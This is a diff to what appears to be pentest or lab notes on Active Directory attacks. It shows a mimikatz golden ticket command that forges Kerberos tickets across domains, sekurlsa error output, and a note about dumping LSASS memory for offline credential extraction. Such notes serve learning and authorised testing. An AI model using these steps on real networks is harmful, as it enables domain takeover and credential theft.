@@ -75,6 +75,15 @@ Golden ticket (Admin not required)
 ```shell!
 mimikatz# kerberos::golden /user:dummy /domain:dev.example.com /sid:<child domain SID> /krbtgt:<hash> /sids:<target domain SID> /ptt
 ```
+
+Got the following errors and no fix worked. I manually dumped the LSASS memory (40MB!) and analyzed it on Linux.
+
+```text!
+ERROR kuhl_m_sekurlsa_acquireLSA ; Key import
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)
+```
+
+
 </div><div>
 
 DCSync (Admin required)
